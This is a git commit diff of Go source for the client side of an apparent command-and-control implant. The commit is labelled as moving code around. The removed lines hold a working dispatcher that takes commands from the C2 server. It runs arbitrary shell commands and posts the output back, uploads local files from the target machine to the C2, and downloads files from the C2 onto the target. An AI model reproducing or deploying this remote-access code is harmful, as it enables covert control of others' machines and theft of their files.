0c2e2f80302104ddc47c99d52eb2bfa19f005d62
elleven11 <federico.cassano@federico.codes>
2021-07-19 03:01:16 +0200

    moved things arround

--- client/client.go
+++ client/client.go
@@ -1,20 +1,15 @@
 package client
 
 import (
-	"bytes"
 	"crypto/tls"
 	"crypto/x509"
 	"errors"
 	"fmt"
-	"io"
 	"io/ioutil"
 	"log"
 	"math/rand"
-	"mime/multipart"
 	"net/http"
-	"os"
 	"os/exec"
-	"path/filepath"
 	"strconv"
 	"strings"
 	"time"
@@ -103,120 +98,6 @@ func RequestCommand(client *http.Client, host string, port int) (string, string)
 
 	defer resp.Body.Close()
 	return strings.Trim(string(body), " \n\r"), hoststr
-}
-
-// Middleware splits of the flow corresponding to the cmd
-// string and delegates to the method that is repsonsible for
-// taking out the action.
-func Middleware(client *http.Client, cmd string, host string) {
-	if strings.Compare(cmd, "quit") == 0 {
-		log.Println("[+] Quitting due to quit cmd from c2")
-		os.Exit(0)
-	} else if strings.HasPrefix(cmd, "upload") {
-		cmdTokens := strings.Split(cmd, " ")
-		if len(cmdTokens) < 3 {
-			log.Println("[-] Invalid upload command syntax.")
-		} else {
-			localFilePath := cmdTokens[1]
-			remoteFilePath := cmdTokens[2]
-			UploadFile(client, host+uploadFileURL, localFilePath, remoteFilePath)
-		}
-	} else if strings.HasPrefix(cmd, "download") {
-		cmdTokens := strings.Split(cmd, " ")
-		if len(cmdTokens) < 3 {
-			log.Println("[-] Invalid download command syntax.")
-		} else {
-			remoteFilePath := cmdTokens[1]
-			localFilePath := cmdTokens[2]
-			DownloadFile(client, host+downloadFileURL+"?file="+remoteFilePath, localFilePath)
-		}
-	} else {
-		out := ExecAndGetOutput(string(cmd))
-		log.Printf("[+] Sending back output:\n%s\n", string(out))
-		req, err := http.NewRequest("POST", host+cmdOutputURL, bytes.NewBuffer(out))
-		if err != nil {
-			log.Printf("[-] Error creating the GET request: %s\n", err)
-			return
-		}
-
-		req.Header.Add("Token", ClientToken)
-		req.Header.Set("Content-Type", "text/html")
-
-		client.Do(req)
-	}
-	client.CloseIdleConnections()
-}
-
-// UploadFile uploads a local file on the target machine to the c2.
-func UploadFile(client *http.Client, url string, localFilePath string, remoteFilePath string) {
-	// open the file of interest
-	file, err := os.Open(localFilePath)
-	if err != nil {
-		log.Printf("[-] Error opening file: %s\n", err)
-		return
-	}
-	defer file.Close()
-
-	// create the form file
-	body := &bytes.Buffer{}
-	writer := multipart.NewWriter(body)
-	part, err := writer.CreateFormFile("uploadFile", filepath.Base(remoteFilePath))
-	if err != nil {
-		log.Printf("[-] Error creating form file: %s\n", err)
-		return
-	}
-	_, err = io.Copy(part, file)
-	err = writer.Close()
-	if err != nil {
-		log.Printf("[-] Error closing the multipart writer: %s\n", err)
-		return
-	}
-
-	// create the request
-	req, err := http.NewRequest("POST", url, body)
-	req.Header.Set("Content-Type", writer.FormDataContentType())
-	if err != nil {
-		log.Printf("[-] Error creating the request: %s\n", err)
-		return
-	}
-
-	// send it off
-	_, err = client.Do(req)
-	if err != nil {
-		log.Printf("[-] Error sending upload request: %s\n", err)
-		return
-	}
-	log.Println("[+] Uploaded file.")
-}
-
-// DownloadFile downloads a file from the c2 to the local target machine.
-func DownloadFile(client *http.Client, url string, filePath string) {
-	// get the file data
-	log.Println(url)
-	resp, err := client.Get(url)
-	if err != nil {
-		log.Printf("[-] Error getting file to download from c2: %s\n", err)
-		return
-	}
-	defer resp.Body.Close()
-
-	// create downloads dir if not existant yet
-	_ = os.Mkdir("downloads", 0755)
-	// create local file
-	out, err := os.Create("downloads/" + filePath)
-	if err != nil {
-		log.Printf("[-] Error creating local file: %s\n", err)
-		return
-	}
-	defer out.Close()
-
-	// and write data to it
-	_, err = io.Copy(out, resp.Body)
-	if err != nil {
-		log.Printf("[-] Error writing to local file: %s\n", err)
-		return
-	}
-	log.Println("[+] Successfully downloaded file")
 }
 
 // ExecAndGetOutput executes the command string on the OS
